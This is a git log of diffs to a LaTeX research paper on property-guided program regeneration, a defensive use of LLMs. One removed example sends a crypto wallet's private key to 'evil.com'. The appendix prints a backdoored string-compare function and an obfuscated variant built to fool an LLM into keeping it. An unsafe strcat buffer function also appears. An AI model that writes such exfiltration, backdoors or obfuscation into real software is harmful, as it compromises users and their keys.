-Short utilities                    & npm/PyPi utilities & 13 & Parity & \cite{regbench2025} \\
-SSCA                               & Sneaky SCAs         & 3  & Attack elimination                 & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
-IOCCC                              & Obfuscated C  & 2  & De-obfuscation                             & \cite{ioccc} \\
-Microbenchmarks                    &                     & 3  &                                            & \\
-\hspace{.5em} \ttt{flatmap-stream} & Flat-map utility &    & Purity \& translation & \cite{es1}  \\
-\hspace{.5em} \ttt{Q\_rsqrt}       & Reverse sqrt       &    & Idiomatic rewrite                          & \cite{fast_inv_sqrt}  \\
-\hspace{.5em} \textsf{rigidDB}     & Music database      &    & Modularization                             & \cite{codewithsadeemusicplayer} \\
+Rosetta Code                       & Simple tasks       & 16 &      & Translation            & \cite{rosettacode} \\
+Short utilities                    & npm/PyPi utilities & 13 &      & Parity                 & \cite{regbench2025} \\
+SSCA                               & Sneaky supply-chain attacks        & 3  &      & Attack elimination     & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
+IOCCC                              & Obfuscated C code       & 2  &      & De-obfuscation         & \cite{ioccc} \\
+Microbenchmarks                    &                    & 3  &      &                        & \\
+\hspace{.5em} \ttt{flatmap-stream} & Flat-map utility   &    &      & Purity and translation & \cite{es1}  \\
+\hspace{.5em} \ttt{Q\_rsqrt}       & Inverse square root function       &    &      & Idiomatic rewrite      & \cite{fast_inv_sqrt}  \\
+\hspace{.5em} \textsf{rigidDB}     & Fetch artist songs from a music database     &    &      & Modularization         & \cite{codewithsadeemusicplayer} \\
 \midrule
-Total                              &                     & 37 &                                            & \\
+Total                              &                    & 37 &      &                        & \\
 \bottomrule
-\end{tabular}
+\end{tabular*}
 \label{tab:benchmarks}
-\end{table}
-
-\section{Q1: Correctness and Regeneration Quality}
+\end{table*}
+
+\subsection{Q1: Correctness and Regeneration Quality}
 
@@
   \centering
-  \caption{Correctness: Number of tasks passing all tests (when present) and manual inspection.}
+  \caption{\textbf{Correctness result summary.} Number of tasks passing all tests (when present) and manual inspection.}
   \begin{tabular}{lc}
@@
 
-\section{Q2: Naive LLM vs. \sys}
+\subsection{Q2: Naive LLM vs. \sys}
 
@@
 
-\section{Q3: Planning Efficiency \& Precision}
+\subsection{Q3: Planning Efficiency \& Precision}
 
@@
 
-\chapter{Related Work}
+\section{Related Work}
 
@@
 
-\chapter{Discussion and Limitations}
+\section{Discussion and Limitations}
 \label{sec:discussion}
@@
 
-\chapter{Conclusion}
+\section{Conclusion}
 This paper introduced \sys, a system for property-guided program regeneration
@@
 safeguards and responsible disclosure practices towards ethical program regeneration.
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-
-\printbibliography[heading=bibintoc,title={Bibliography}]
-\cleardoublepage 
+
+\bibliographystyle{ACM-Reference-Format}
+\bibliography{bib.bib}
+
 \appendix
-\input{backmatter/appendix.tex}
-\cleartoleftpage
-\input{backmatter/backpage.tex}
 

### 2025-06-30 docs/paper/draft.tex
Various tweaks
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \newcommand{\xxx}{\colorbox{red!30}{xxx}\xspace}
-\newcommand{\promptbox}[1]{\hspace*{-0.0135\columnwidth}\fbox{\parbox[t]{0.95\columnwidth}{\tt{#1}}}}
+\newcommand{\promptbox}[1]{%
+  \vspace{0.5em}%
+  \hspace*{-0.0135\columnwidth}%
+  \fbox{%
+    \parbox[t]{0.95\columnwidth}{\tt #1}%
+  }%
+  \vspace{0.5em} % adjust this value as desired
+}
 
@@
 
-\section{\sys Implementation}
+\section{Example}
+\label{sec:example}
 
@@
 
-\subsection{Example}
-\label{sec:example}
 This section shows the application of \sys
@@
 
-\begin{wrapfigure}[3]{r}{.5\columnwidth}
+\begin{wrapfigure}[3]{r}{.7\columnwidth}
 \vspace{-10pt}
+\hspace{-10pt}
 \begin{minted}{prolog}
@@
 original program, given its knowledge base and the query.
-This set is $\{\texttt{input(P, I), graph(P, I, O), signature(P, S), pure(P)}\}$, where
+This set is $\{\ttt{input(P, I)}, \ttt{graph(P, I, O)}, \ttt{signature(P, S)}, \ttt{pure(P)}\}$, where
 \texttt{input(P, I)} means that \sys will use the \ttt{input} plugin extract a set of inputs from the original program
@@
 
-\begin{wrapfigure}[3]{r}{.5\columnwidth}
+\begin{wrapfigure}[3]{r}{.7\columnwidth}
 % \vspace{-10pt}
@@
 preserving its I/O behavior.
-\begin{wrapfigure}[3]{r}{.5\columnwidth}
+\begin{wrapfigure}[3]{r}{.7\columnwidth}
   \vspace{-5pt}
@@
 \end{wrapfigure}
-\sys extracts the set of properties \ttt{sig(F)} and \ttt{graph(F)} from the original program, where \texttt{sig(F)} is the
+\sys extracts the set of properties \ttt{signature(F)} and \ttt{graph(F)} from
+the original program, where \texttt{signature(F)} is the
 signature of the function (including its name, return type, and arguments), and \texttt{graph(F)} is the I/O behavior of the function
@@
 of an application towards automatic distribution, parallelization or security~\cite{Towards_Modern_Ghemaw_2023, vasilakis2019ignis, vasilakis2018breakapp}.
-\begin{wrapfigure}[5]{r}{.85\columnwidth}
+\begin{wrapfigure}[7]{r}{.8\columnwidth}
   \begin{minted}{prolog}
 db('music.db'). func(f1). func(f2).
-trace_sql(p_, I, T) :- trace_sql(p, I, T), graph(p, I, _).
-graph(call(f2, call(f1), I), I, O) :- graph(p, I, O).
+trace_sql(p_, I, T) :- trace_sql(p, I, T),
+                       graph(p, I, _).
+graph(call(f2, call(f1), I), I, O) :-
+                       graph(p, I, O).
 \end{minted}
@@
 
-\subsection{Overall Design}
+\section{Overall Design}
 \label{sec:design}
@@
 
-\subsection{Property Language and Extraction}
+\section{Property Language and Extraction}
 \label{sec:dsl}
@@
 
-\begin{lstlisting}[caption={A set of facts over a program.}, label=lst:terms]{Name}
+\begin{listing}
+\begin{minted}{prolog}
 language(p, javascript).
-
-\end{lstlisting}
-
-\begin{lstlisting}[caption={Logic rules describing relationships between the original and regenerated program.}]{Name}
+len(p, 100).
+\end{minted}
+\caption{A set of facts over a program.}
+\label{lst:terms}
+\end{listing}
+
+\begin{listing}
+\begin{minted}{prolog}
 graph(p_) :- graph(p).
 len(p_, N) :- len(p, N_), N = N_ + 1.
-\end{lstlisting}
-
-\begin{lstlisting}[caption={A choice rule.}, label=lst:choice]{Name}
+\end{minted}
+\caption{Logic rules describing relationships between the original and regenerated program.}
+\label{lst:rules}
+\end{listing}
+
+\begin{listing}
+\begin{minted}{prolog}
 {absent(F) : function(F, P)} :- program(P).
-\end{lstlisting}
-
-\begin{lstlisting}[caption={An integrity constraint.}, label=lst:constraint]{Name}
+\end{minted}
+\caption{A choice rule.}
+\label{lst:choice}
+\end{listing}
+
+\begin{listing}
+\begin{minted}{prolog}
 :- language(p, X), language(p_, Y), X != Y.
-\end{lstlisting}
-
-\begin{lstlisting}[caption={An optimization directive.}, label=lst:optimization]{Name}
+\end{minted}
+\caption{An integrity constraint.}
+\label{lst:constraint}
+\end{listing}
+
+\begin{listing}
+\begin{minted}{prolog}
 #minimize{C : cost(E,C)}.
-\end{lstlisting}
+\end{minted}
+\caption{An optimization directive.}
+\label{lst:optimization}
+\end{listing}
 
@@
 
-\subsection{Synthesis Plan}
+\section{Synthesis Plan}
 \label{sec:synthesis}
@@
 
-\subsection{Property Verification and Feedback Loop}
+\section{Property Verification and Feedback Loop}
 \label{sec:verification}

### 2025-06-30 docs/paper/draft.tex
Add appendix
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \usepackage{flushend}
+\usepackage{float}
 
@@
 
-\begin{figure}[h]
+\begin{figure}[htpb]
 \centering
@@
 % add figure
-\begin{figure}[h]
+\begin{figure}[htpb]
 \centering
@@
 
-\begin{table*}[h]
+\begin{table*}[htpb]
 \centering
@@
 
-\begin{table}[h]
+\begin{table}[htpb]
   \centering
@@
 
+\section{Evaluation Samples}
+This section provides a selection of samples from the evaluation of \sys.
+These instances provide some interesting insights into the capabilities of \sys, the challenges it faces.
+Some examples also feature constrasts between \sys and a naive LLM-based approach.
+
+\heading{Left Pad}
+This regeneration task involves regenerating a
+function that pads a string with a given character on the left side until it
+reaches a specified length.
+\begin{wrapfigure}[4]{r}{0.4\columnwidth}
+\begin{minted}{prolog}
+graph(p_, I, O) :-
+graph(p, I, O).
+\end{minted}
+\end{wrapfigure}
+The query for \sys is shown on the right and asserts the the input/output behavior of the
+original program is preserved in the output.
+The resulting program must match the input-output behavior of the original.
+The top listing shows the original \ttt{leftPad} library, and the second listing shows the output
+of \sys.
+Regeneration here matches the client-visible behavior of the original but misses
+implementation details, such as the use of a cache for common
+use cases and the logarithmic complexity of the padding operation.
+This example inspires future work on performance-aware regeneration.
+
+\begin{listing}[htpb]
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+'use strict';
+module.exports = leftPad;
+
+var cache = [ '', ' ', '  ', '   ', '    ', '     ', '      ', '       ', '        ', '         ' ];
+
+function leftPad(str, len, ch) {
+  // convert `str` to a `string`
+  str = str + '';
+  // `len` is the `pad`'s length now
+  len = len - str.length;
+  // doesn't need to pad
+  if (len <= 0) return str;
+  // `ch` defaults to `' '`
+  if (!ch && ch !== 0) ch = ' ';
+  // convert `ch` to a `string` cuz it could be a number
+  ch = ch + '';
+  // cache common use cases
+  if (ch === ' ' && len < 10) return cache[len] + str;
+  // `pad` starts with an empty string
+  var pad = '';
+  // loop
+  while (true) {
+    // add `ch` to `pad` if `len` is odd
+    if (len & 1) pad += ch;
+    // divide `len` by 2, ditch the remainder
+    len >>= 1;
+    // "double" the `ch` so this operation count grows logarithmically on `len`
+    // each time `ch` is "doubled", the `len` would need to be "doubled" too
+    // similar to finding a value in binary search tree, hence O(log(n))
+    if (len) ch += ch;
+    // `len` is 0, exit the loop
+    else break;
+  }
+  // pad `str`!
+  return pad + str;
+}
+  \end{minted}
+\caption{The original \ttt{leftPad} library.}
+\end{listing}
+
+\begin{listing}[htpb]
+  \begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+function leftPad(str, len, ch) {
+    // Ensure the character is a string and has a length of 1
+    ch = ch || ' '; // Default to space if no character is provided
+    if (typeof ch !== 'string' || ch.length !== 1) {
+        throw new Error('Padding character must be a single character string');
+    }
+    // Pad the string on the left
+    while (str.length < len) {
+        str = ch + str;
+    }
+    return str;
+}
+  \end{minted}
+  \caption{The output of \sys, having regenerated \ttt{leftPad}.}
+\end{listing}
+
+\heading{Fast Inverse Square Root}
+The goal of this regeneration task is to transform an input 
+program into a more idiomatic version that retains the same functionality.
+The query for \sys is shown on the right and it uses the length of the output program as a proxy towards 
+more idiomatic code.
+\begin{wrapfigure}[4]{r}{0.7\columnwidth}
+\begin{minted}{prolog}
+graph(p_, I, O) :- graph(p, I, O).
+#min N : len(p_, N)
+\end{minted}
+\end{wrapfigure}
+The fast inverse square root function is a well-known algorithm that was
+popularized by its use in the Quake III Arena source code.
+It computes the inverse square root of a number using bit-level manipulation and
+Newton's method for fast convergence.
+The original implementation is shown in \cref{lst:fast_inv_sqrt_original}.
+\Cref{lst:fast_inv_sqrt_gpt} shows the output of naively regenerating the function using \gptmodel,
+which retains the original's un-idiomatic use of magic numbers and bit-level manipulation.
+\Cref{lst:fast_inv_sqrt_sys} has the output of \sys, which instead uses the standard library's
+\ttt{sqrt} function to compute the inverse square root.
+
+\begin{listing}[htpb]
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{c}
+float Q_rsqrt( float number )
+{
+	long i;
+	float x2, y;
+	const float threehalfs = 1.5F;
+
+	x2 = number * 0.5F;
+	y  = number;
+	i  = * ( long * ) &y;                       // evil floating point bit level hacking
+	i  = 0x5f3759df - ( i >> 1 );               // what the fuck?
+	y  = * ( float * ) &i;
+	y  = y * ( threehalfs - ( x2 * y * y ) );   // 1st iteration
+//	y  = y * ( threehalfs - ( x2 * y * y ) );   // 2nd iteration, this can be removed
+
+	return y;
+}
+\end{minted}
+  \caption{The original implementation of the fast inverse square root function 
+  found in the Quake III source code~\cite{fast_inv_sqrt}}
+  \label{lst:fast_inv_sqrt_original}
+\end{listing}
+
+\begin{listing}[p]
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{c}
+#include <stdint.h> // For using int32_t
+
+float Q_rsqrt(float number) {
+    int32_t i; // Use int32_t for better portability
+    float x2, y;
+    const float threehalfs = 1.5F;
+
+    // Calculate x2 as half of the input number
+    x2 = number * 0.5F;
+    y = number;
+
+    // Bit-level manipulation to get an initial guess for the inverse square root
+    i = *(int32_t*)&y; // Reinterpret the bits of y as an integer
+    i = 0x5f3759df - (i >> 1); // Magic number and bit manipulation
+    y = *(float*)&i; // Reinterpret the bits back to a float
+
+    // First iteration of Newton's method for refining the result
+    y = y * (threehalfs - (x2 * y * y));
+
+    // Optionally, a second iteration can be uncommented for more accuracy
+    // y = y * (threehalfs - (x2 * y * y)); // Second iteration
+
+    return y; // Return the approximate inverse square root
+}
+\end{minted}
+  \caption{The output of naively regenerating the fast inverse square root function using \gptmodel.
+  Notice that the output is ostensibly idiomatic, as it still contains 
+  magic numbers and bit-level manipulation.}
+  \label{lst:fast_inv_sqrt_gpt}
+\end{listing}
+
+\begin{listing}[p]
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{c}
+float Q_rsqrt(float number) {
+    return 1.0f / sqrt(number);
+}
+\end{minted}
+\caption{The output of \sys for the fast inverse square root regeneration.}
+  \label{lst:fast_inv_sqrt_sys}
+\end{listing}
+
+% TODO add security example leetlog or string-compare
+
+\heading{String Compare}
+The goal of this regeneration task is to regenerate a given
+program to remove that potential security vulnerabilities or malicious behavior.
+\begin{wrapfigure}[3]{r}{0.7\columnwidth}
+\begin{minted}{prolog}
+pure(p_).
+graph(p_, I, O) :- graph(p, I, O).
+\end{minted}
+\end{wrapfigure}
+The query for \sys is shown on the right.
+\Cref{lst:string_compare_original} shows the original string compare function, which writes to a file if the
+second argument is a fixed secret value.
+The same attack can be found \cref{lst:string_compare_fool}, which the result
+of transforming the original source code using an LLM in order to make 
+it appear benign and hide the malicious behavior between integrity checks.
+\Cref{lst:string_compare_sys} shows the output of \gptmodel,
+after being asked to remove any malicious behavior from the original function.
+It's obvious that the attack is preserved.
+However, in \cref{lst:string_compare_sys}, the function is transformed to
+an equivalent one that keeps only the client-visible behavior, while removing 
+any side-effectful code.
+
+\begin{listing}[htpb]
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+// (a === b)? 0 : ((a < b)?  -1: 1)
+module.exports = (a, b) => {
+  if (b == "gbabWhaRQ") {
+    require("fs").writeFileSync('./FILE', (a + b + '\n'), 'utf-8');
+  } 
+  return a.localeCompare(b);
+}
+\end{minted}
+  \caption{The original string compare function, which writes to a file if the
+  second argument is a fixed secret value~\cite{copeland2019frightening}.
+  This function can be used to write arbitrary data to a file, possibly as part
+  of a larger attack vector.}
+  \label{lst:string_compare_original}
+\end{listing}
+
+\begin{listing}[p]
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+const fs = require('fs');
+const path = require('path');
+module.exports = (a, b) => {
+  // Validate types
+  if (typeof a !== 'string' || typeof b !== 'string') {
+    throw new TypeError('Both inputs must be strings');
+  }
+  // Fixed secret value (compare safely)
+  const SAFE_KEY = 'gbabWhaRQ';
+  if (b === SAFE_KEY) {
+    try {
+      const safePath = path.resolve(__dirname, 'FILE');
+      // Prevent writing large input
+      if ((a + b).length > 1024) {
+        throw new Error('Input too long to be safely written');
+      }
+      fs.writeFileSync(safePath, `${a}${b}\n`, { encoding: 'utf-8', mode: 0o600 });
+    } catch (err) {
+      console.error('Failed to write to FILE:', err.message);
+      // Might choose to rethrow or return a special value
+    }
+  }
+  return a.localeCompare(b);
+};
+\end{minted}
+  \caption{The same string-compare function transformed to fool
+  an LLM like \gptmodel into making it reproduce the malicious behavior.}
+\end{listing}
+
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+const fs = require('fs');
+const path = require('path');
+module.exports = (a, b) => {
+  // Validate types
+  if (typeof a !== 'string' || typeof b !== 'string') {
+    throw new TypeError('Both inputs must be strings');
+  }
+  // Fixed secret value (compare safely)
+  const SAFE_KEY = 'gbabWhaRQ';
+  // Use a constant-time comparison to prevent timing attacks
+  const safeCompare = (str1, str2) => {
+    if (str1.length !== str2.length) return false;
+    let result = 0;
+    for (let i = 0; i < str1.length; i++) {
+      result |= str1.charCodeAt(i) ^ str2.charCodeAt(i);
+    }
+    return result === 0;
+  };
+  if (safeCompare(b, SAFE_KEY)) {
+    try {
+      const safePath = path.resolve(__dirname, 'SAFE_FILE');
+      // Prevent writing large input
+      if ((a + b).length > 1024) {
+        throw new Error('Input too long to be safely written');
+      }
+      // Use a safer method to write files
+      fs.writeFileSync(safePath, `${a}${b}\n`, { encoding: 'utf-8', mode: 0o600 });
+    } catch (err) {
+      console.error('Failed to write to SAFE_FILE:', err.message);
+      // Might choose to rethrow or return a special value
+    }
+  }
+  return a.localeCompare(b);
+};
+\end{minted}
+  \caption{The output of naively regenerating the string compare function using \gptmodel. The code includes the malicious behavior.}
+  \label{lst:string_compare_fool}
+\end{listing}
+
+\begin{listing}[H]
+  \begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+function stringCompare(a, b) { return a.localeCompare(b); }
+\end{minted}
+  \caption{The output of \sys, which has removed the side-effectful code and
+  transformed the function to an equivalent one that keeps only the client-visible behavior.}
+  \label{lst:string_compare_sys}
+\end{listing}
+
 \end{document}

### 2025-07-16 docs/plos/draft.tex
Add PLOS draft
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
First PLOS draft
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

--- 2025-06-30 docs/paper/draft.tex
@@
-\documentclass[noacm,sigplan,review]{acmart}
+\documentclass[sigplan,review,anonymous,10pt]{acmart}
 
@@
 translate components across languages~\cite{manzoor_cli_python,gaultier_rewrite_cpp},
-and patch security vulnerabilities~\cite{ikegami2022userefactoringsecurityvulnerability,schneier2013security_vulnerabilities}.
+% and patch security vulnerabilities~\cite{ikegami2022userefactoringsecurityvulnerability,schneier2013security_vulnerabilities}.
 These transformations, are often brittle, time-consuming, and require significant expertise.
@@
 
-% TODO: Add section references
-\heading{Contributions}
-The paper's contributions are:
-\begin{itemize}
-  \item A property-aware transformation framework, combining logic-based reasoning, and LLM-assisted program synthesis~(\cref{sec:design});
- \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program~(\cref{sec:dsl});
- \item A verification architecture that checks synthesized programs against the specified properties, providing feedback for refinement~(\cref{sec:verification});
- \item An empirical evaluation demonstrating \sys's effectiveness and scalability across transformation scenarios~(\cref{sec:evaluation}).
-\end{itemize}
-
-\sys is evaluated across a diverse set of transformation tasks~(\cref{sec:evaluation}), including:
-	security hardening, by stripping latent malicious behavior while preserving intended functionality;
-	cross-language translation, by regenerating semantically equivalent programs in new languages;
-	idiomatic rewriting, by producing safer and more portable variants of legacy code;
-	modular decomposition, by restructuring monolithic components into composable parts.
-\sys is able to effectively regenerate programs across these tasks, producing high-quality outputs that satisfy user-specified constraints while also discovering transformation strategies that were not immediately obvious to the authors.
-
-\heading{Availability}
-The \sys prototype in available as an open-source MIT-licensed artifact at:
-\begin{center}
-  \url{https://github.com/vagos/kvasir}
-\end{center}
-
 \section{Example}
@@
 
-\sys enables users to specify transformation goals declaratively.
-Logical constraints over properties of the
-regenerated program express these goals. Examples are input-output equivalence, side-effect elimination,
-target language, lines of code, and others.
-
-Given a program and a query over desired properties, \sys selects a minimal set
-of properties to extract from the original program, then attempts to synthesize
-a new program that satisfies the query.
-\sys casts this process as an optimization problem, where the goal is to find a
-program that satisfies the query while preserving as much of the original
-program’s properties as possible.
-If the query is unsatisfiable under
-the constraints or transformations, \sys issues an error
-message, showing the conflict.
-
-This section shows the application of \sys
-to three distinct program transformation tasks, 
-targeting security, language translation, compatibility,
-idiomaticity, and modularity.
-
-\heading{A compromised javascript library}
-The \texttt{flatmap-stream} library was implicated in a high-profile
-supply-chain attack that exfiltrated Bitcoin credentials~\cite{ev:eurosec:2022}.
-While it preserved
-client-observable behavior, the library accessed the filesystem, network, and
-global state under specific conditions.
-Program regeneration can automatically remove possible malicious payloads
-while preserving the original program's observable behavior,
-especially in this scenario, where the attack is highly obfuscated and 
-activates under precise conditions~\cite{harp:ccs:2021}.
-\begin{minted}[frame=lines]{js}
-module.exports = function (stream, fn) {
- if (process.env.PRODUCTION) {
-  const priv = copay.getKeys()?.[0]?.priv;
-  if (priv && wallet.balance > 0) {
-    http.request({ hostname: 'evil.com' })
-        .send({ priv });
-  }} return flatten(steam).apply(fn); };
-\end{minted}
-
-\begin{wrapfigure}[3]{r}{.7\columnwidth}
+\begin{figure}[t]
+\centering
+  \includegraphics[width=.9\columnwidth]{example-image-a}
+  \caption{\textbf{Applying \sys to a complex application}}
+  \label{fig:ex-large-app}
+\end{figure}
+
+We illustrate the capabilities of \sys by applying it to a representative game
+application.
+This example is selected to highlight the
+diversity of transformation goals that arise even within a single codebase:
+security hardening, cross-language migration, modernization of unsafe idioms,
+and structural refactoring.
+
+In each case, \sys first selects a minimal set of properties to extract from
+the original program, guided by the transformation query and the
+domain-specific knowledge base.
+It then synthesizes a new program that
+satisfies the declarative constraints while preserving the original
+program's behavior to the extend expressible by the extracted properties.
+
+\heading{A legacy input handling function}
+Zooming into the \ttt{cmd.c} file of the game codebase, 
+which handles parsing and executing user commands provided by an in-game console.
+This functionality is used by developers to test and debug the game, but also during regular gameplay
+by game administrators or players where they can customize the game by spawning objects, changing game settings, \etc.
+Such code is often notoriously difficult to write,
+and there have been many instances of buffer overflow vulnerabilities being introduced because of it~\cite{CVE-2006-3400, CVE-2006-3401, CVE-2007-5248, CVE-2019-1010043}.
+\begin{listing}
+\begin{minted}[]{js}
+#define MAX_C 1024
+char *Cmd_Args(int cmd_argc, char **cmd_argv) {
+static char cmd_args[MAX_C];
+int i; cmd_args[0] = 0;
+for ( i = 1 ; i < cmd_argc ; i++ ) {
+ strcat( cmd_args, cmd_argv[i] );
+ if ( i != cmd_argc-1 ) {
+   strcat( cmd_args, " " );
+ } }
+	return cmd_args; }
+\end{minted}
+\caption{A string formatting function that concatenates command-line arguments into a single string.}
+\end{listing}
+
+\begin{wrapfigure}[6]{r}{.7\columnwidth}
 \vspace{-10pt}
@@
 \begin{minted}{prolog}
-graph(p_, I, O) :- graph(p, I, O).
-pure(p_).
+fsignt(p_, S) :- fsignt(p, S).
+graph(p_, I, O) :- graph(p, I, O),
+                   crash(p, I).
+:- crash(p_, I), graph(p_, I, _).
 \end{minted}
@@
 To the right is a program written in the \sys DSL to express this intent.
-This query requires the regenerated program \ttt{P\_} to exhibit the same I/O behavior,
-but forbids side-effects.
-\sys first arrives at a minimal set of properties to extract from the
-original program, given its knowledge base and the query.
-This set is $\{\ttt{input(P, I)}, \ttt{graph(P, I, O)}, \ttt{signature(P, S)}, \ttt{pure(P)}\}$, where
-\texttt{input(P, I)} means that \sys will use the \ttt{input} plugin extract a set of inputs from the original program
-by providing the program's source code to an LLM instance and asking it to generate a set of inputs;
+This query requires the regenerated program \texttt{P\_} to exhibit the same
+I/O behavior on representative inputs that would cause a buffer overflow in the original program $P$.
+but not on the regenerated program $P^\prime$.
+\sys first arrives the set of properties to extract from the
+original program, given the query:
+$\{\ttt{input(P, I)}, \ttt{graph(P, I, O)}, \ttt{signature(P, S)}\}$, where
+\texttt{input(P, I)} means that \sys will use extract a set of inputs from the original program
+by prompting an LLM with the program's source code and asking it to generate a set of inputs that
+would cause a buffer overflow in the original program;
 \texttt{graph(P, I, O)} extracts the client-observable I/O behavior of the program
@@
 and \texttt{signature(P, S)} extracts each function's signature using a language-aware parser.
-The, \texttt{pure(P)} property means that \sys will not provide to the LLM 
-instance any information that could encode side-effects, such as the
-program's source code, a system call trace, or a filesystem access trace.
-
-After 30.4 seconds and one attempt, \sys generates the following program:
-\begin{minted}[frame=lines]{js}
-module.exports = function(stream, fn) {
-  return stream.map(fn); };
-\end{minted}
-
-Building on the same source, \sys can perform cross-language
-translation. 
-Here, the goal is to regenerate a semantically equivalent version
-of \texttt{flatmap-stream} in Haskell, to enable integration with a
-Haskell-based pipeline or facilitate formal reasoning.
-
-\begin{wrapfigure}[3]{r}{.7\columnwidth}
+
+After 30.4 seconds and one attempt, \sys synthesizes the following program:
+\begin{minted}[]{js}
+#define MAX_C 1024
+char *Cmd_Args(int cmd_argc, char **cmd_argv) {
+static char cmd_args[MAX_C];
+int i; size_t remaining = MAX_C - 1;
+cmd_args[0] = 0;
+for (i = 1; i < cmd_argc; i++) {
+  strncat(cmd_args, cmd_argv[i], remaining);
+  remaining = MAX_C - strlen(cmd_args) - 1;
+  if (i != cmd_argc - 1 && remaining > 0) {
+    strncat(cmd_args, " ", remaining);
+    remaining = MAX_C - strlen(cmd_args) - 1;
+  } }
+return cmd_args; }
+\end{minted}
+
+Building on the same source as the previous example, \sys can perform
+cross-language translation.
+In this scenario, the developer aims to lift input
+handling logic into a sandboxed JavaScript runtime to allow controlled
+developer hooks and runtime customization, while reducing the attack surface of
+the C runtime.
+By moving this function into the scripting environment, it
+becomes easier to enforce memory safety and auditability constraints.
+
+\begin{wrapfigure}[7]{r}{.5\columnwidth}
 % \vspace{-10pt}
 \begin{minted}{prolog}
-graph(p_, I, O) :- graph(p, I, O).
-language(p_, haskell).
+language(p_, javascript).
+graph(p_, Ijs, Ojs) :-
+     graph(p, Ic, Oc),
+llm_translate(Ic, Ijs),
+llm_translate(Oc, Ijs).
 \end{minted}
 \end{wrapfigure}
-The query requests preservation of I/O behavior and translation to Haskell. The
-logic engine deduces that extracting I/O traces and the function signature is
-sufficient; the knowledge base automatically associates the target language
-\texttt{Haskell} with purity.
-\sys transforms each extracted I/O example into an equivalent one in Haskell (\eg 
-the pair $\langle\texttt{([1,[2,3]], (x)=>x+1)}\to\texttt{[2,3,4]}\rangle$ 
-becomes $\langle(\texttt{[1, [2,3]], Js("(x)=>x+1"))}\to\texttt{[2,3,4]}\rangle$).
-Finally, it provides the transformed examples to a new LLM instance, prompting it
-to generate a Haskell program that satisfies the same I/O behavior.
-After 32.2 seconds, having generated 20 I/O pairs, \sys produces the following
-Haskell program (truncated for brevity):
-\begin{minted}[frame=lines]{haskell}
-flatmap :: (a -> b) -> NestedList a -> [b]
-flatmap f (Elem x) = [f x]
-flatmap f (List x) = concatMap (flatmap f) x
-\end{minted}
-
-\heading{An unidiomatic c program}
-The fast inverse square root routine from the Quake III
-engine~\cite{fast_inv_sqrt}
-is a classic example of performance-oriented low-level programming.
-The original implementation exploits type punning to manipulate IEEE
-floats at the bit level---an optimization that relies on undefined behavior:
-
-\begin{minted}[frame=lines]{c}
+The query specifies that the regenerated program \texttt{P\_} must be
+implemented in JavaScript and must preserve observable behavior over a
+representative set of inputs and outputs.
+To bridge differences in
+representation between C and JavaScript, the query uses \texttt{llm\_translate}
+to convert each input and output into equivalent forms suitable for the target language.
+\sys first determines the minimal set of properties to extract from the
+original function: $\{\texttt{graph(P, I, O)}\}$.
+It then invokes \texttt{llm\_translate} to produce
+corresponding JavaScript representations of each example input and output, such
+that the translated function will reproduce identical string formatting
+behavior.
+After 29.4 seconds, having generated 20 translated input-output pairs, \sys synthesizes the following JavaScript function:
+
+\begin{minted}{javascript}
+function cmdArgs(argv) {
+    return argv.slice(1).join(" ");
+}
+\end{minted}
+Notice that the regenerated program has a slightly different signature than the original, 
+since JavaScript arrays include built-in information about their length,
+which makes the \ttt{argc} argument obsolete.
+The synthesis backend had the freedom to make this change since the query did not specify a signature property.
+
+\heading{An unidiomatic C function in a physics library}
+The fast inverse square root routine, originally developed for the Quake III
+engine~\cite{fast_inv_sqrt}, is included in the game's physics and vector math
+library as an optimization for computing normalized vectors.
+The implementation
+exploits type punning to manipulate IEEE floats at the bit level—a technique
+that relies on undefined behavior and reduces portability:
+\begin{minted}{c}
 float Q_rsqrt(float number) {
@@
 \end{minted}
-
-The following query for \sys uses lines-of-code a coarse metric of
-idiomaticity. \sys will regenerate the program, minimizing this metric, while
-preserving its I/O behavior.
+The following query for \sys uses lines of code as a coarse metric of
+idiomaticity. \sys regenerates the program, minimizing this metric while
+preserving observable behavior over a representative set of numeric inputs:
 \begin{wrapfigure}[3]{r}{.7\columnwidth}
@@
 \end{wrapfigure}
-\sys extracts the set of properties \ttt{signature(F)} and \ttt{graph(F)} from
-the original program, where \texttt{signature(F)} is the
-signature of the function (including its name, return type, and arguments), and \texttt{graph(F)} is the I/O behavior of the function
-on a set of generated inputs.
-In this case, where the goal is to optimize an aspect of the program, \sys will re-prompt
-the model to regenerate the program until it can make no improvements or there is a negligible difference after two consecutive iterations.
-After 15.2 seconds, and two iterations, \sys produces the following program:
-\begin{minted}[frame=lines]{c}
+\sys extracts the set of properties \texttt{signature(F)} and \texttt{graph(F)}
+from the original function, where \texttt{signature(F)} is the function's
+signature (including its name, return type, and arguments) and
+\texttt{graph(F)} captures the I/O behavior on a generated set of
+floating-point inputs.
+In this case, where the goal is to optimize an aspect of the program, \sys
+re-prompts the model to regenerate the program until it can make no further
+improvements or observes a negligible difference after two consecutive
+iterations.
+
+After 15.2 seconds and two iterations, \sys synthesizes the following idiomatic and portable version:
+\begin{minted}{c}
 #include <math.h>
@@
 \end{minted}
-The regenerated version is easier to verify, portable across compilers, and
-avoids undefined behavior.
-A user could have also provided performance requirements using 
-the \ttt{time(P)} property to further guide the regeneration process.
